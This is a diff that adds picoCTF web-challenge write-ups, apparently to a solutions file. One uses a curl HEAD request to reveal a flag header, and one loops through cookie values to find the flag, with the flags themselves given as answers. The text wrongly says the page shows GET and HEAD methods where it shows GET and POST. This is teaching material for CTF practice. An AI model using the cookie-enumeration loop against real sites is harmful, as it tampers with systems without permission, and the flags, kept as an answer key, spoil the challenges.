@@ -2354,6 +2354,89 @@ Find the flag being held on this server to get ahead of the competition http://m
 
 <summary markdown="span">Solution 1</summary>
 
+We can first inspect the webpage source:
+
+~~~html
+<!doctype html>
+<html>
+<head>
+    <title>Blue</title>
+    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+	<style>body {background-color: blue;}</style>
+</head>
+	<body>
+		<div class="container">
+			<div class="row">
+				<div class="col-md-6">
+					<div class="panel panel-primary" style="margin-top:50px">
+						<div class="panel-heading">
+							<h3 class="panel-title" style="color:red">Red</h3>
+						</div>
+						<div class="panel-body">
+							<form action="index.php" method="GET">
+								<input type="submit" value="Choose Red"/>
+							</form>
+						</div>
+					</div>
+				</div>
+				<div class="col-md-6">
+					<div class="panel panel-primary" style="margin-top:50px">
+						<div class="panel-heading">
+							<h3 class="panel-title" style="color:blue">Blue</h3>
+						</div>
+						<div class="panel-body">
+							<form action="index.php" method="POST">
+								<input type="submit" value="Choose Blue"/>
+							</form>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
+~~~
+
+This shows two HTTP Methods, GET and HEAD. The hints suggest that there may be more than 2 choices.  The HTTP methods are:
+
+- GET
+- POST
+- PUT
+- HEAD
+- DELETE
+- PATCH
+- OPTIONS
+
+The challenge title, Get aHead, suggests that HEAD is the third method to use.  HEAD is very similar to GET. HEAD is used to verify the response of GET requests.  We can send a HEAD request using curl:
+
+~~~shell
+$ curl --verbose --HEAD --silent http://mercury.picoctf.net:15931/index.php
+*   Trying 18.189.209.142:15931...
+* TCP_NODELAY set
+* Connected to mercury.picoctf.net (18.189.209.142) port 15931 (#0)
+> HEAD /index.php HTTP/1.1
+> Host: mercury.picoctf.net:15931
+> User-Agent: curl/7.68.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+< flag: picoCTF{r3j3ct_th3_du4l1ty_82880908}
+flag: picoCTF{r3j3ct_th3_du4l1ty_82880908}
+< Content-type: text/html; charset=UTF-8
+Content-type: text/html; charset=UTF-8
+
+< 
+* Connection #0 to host mercury.picoctf.net left intact
+~~~
+
+This provides the flag:
+
+~~~
+picoCTF{r3j3ct_th3_du4l1ty_82880908}
+~~~
+
 </details>
 
 ### Answer
@@ -2363,7 +2446,7 @@ Find the flag being held on this server to get ahead of the competition http://m
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{r3j3ct_th3_du4l1ty_82880908}
 ~~~
 
 </details>
@@ -2393,6 +2476,183 @@ None
 
 <summary markdown="span">Solution 1</summary>
 
+We can view the page source:
+
+~~~html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Cookies</title>
+
+
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
+
+    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="header">
+            <nav>
+                <ul class="nav nav-pills pull-right">
+                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
+                    </li>
+                </ul>
+            </nav>
+            <h3 class="text-muted">Cookies</h3>
+        </div>
+        
+        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
+        
+      
+      <div class="jumbotron">
+        <p class="lead"></p>
+		<div class="row">
+			<div class="col-xs-12 col-sm-12 col-md-12">
+				<h3>Welcome to my cookie search page. See how much I like different kinds of cookies!</h3>
+			</div>
+		</div>
+		<br/>
+        <div class="search-form">
+            <form role="form" action="/search" method="post">
+            <div class="row">
+                <div class="form-group">
+                    <input type="text" name="name" id="name" class="form-control input-lg" placeholder="snickerdoodle">
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <input type="submit" class="btn btn-lg btn-success btn-block" value="Search">
+                </div>
+            </div>
+        </form>
+    </div>
+</div>
+    <footer class="footer">
+        <p>&copy; PicoCTF</p>
+    </footer>
+
+</div>
+
+<script>
+$(document).ready(function(){
+    $(".close").click(function(){
+        $("myAlert").alert("close");
+    });
+});
+</script>
+</body>
+
+</html>
+~~~
+
+This does not provide much information, however if we send a curl request:
+
+~~~shell
+$ curl -I http://mercury.picoctf.net:21485
+HTTP/1.1 302 FOUND
+Content-Type: text/html; charset=utf-8
+Content-Length: 209
+Location: http://mercury.picoctf.net:21485/
+Set-Cookie: name=-1; Path=/
+~~~
+
+This shows a cookie with field "name" set to -1.  If we change the cookie, we can look at the webpage response:
+
+~~~shell
+$ curl -i http://mercury.picoctf.net:21485/ -H "Cookie: name=1;" -L
+HTTP/1.1 302 FOUND
+Content-Type: text/html; charset=utf-8
+Content-Length: 219
+Location: http://mercury.picoctf.net:21485/check
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 1780
+Set-Cookie: session=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Cookies</title>
+
+
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
+
+    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="header">
+            <nav>
+                <ul class="nav nav-pills pull-right">
+                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
+                    </li>
+                </ul>
+            </nav>
+            <h3 class="text-muted">Cookies</h3>
+        </div>
+        
+        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
+        
+        
+        <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">
+          <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
+            </div>
+      
+      
+      
+        <div class="jumbotron">
+            <p class="lead"></p>
+            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>
+        </div>
+
+
+        <footer class="footer">
+            <p>&copy; PicoCTF</p>
+        </footer>
+
+    </div>
+    <script>
+    $(document).ready(function(){
+        $(".close").click(function(){
+            $("myAlert").alert("close");
+        });
+    });
+    </script>
+</body>
+
+</html>
+~~~
+	
+We can see the webpage contents have changed.  If we iterate through various names, we may be able to find the flag:
+
+~~~shell
+$ for j in {0..100}; do echo "name = $j"; if curl -b name=$j --silent http://mercury.picoctf.net:21485/check | grep -o "\bpicoCTF{\w*}"; then break; fi; done;
+~~~
+
+This provides the flag when the name is set to 18:
+
+~~~
+picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
+~~~
+
 </details>
 
 ### Answer
@@ -2402,7 +2662,7 @@ None
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
 ~~~
 
 </details>
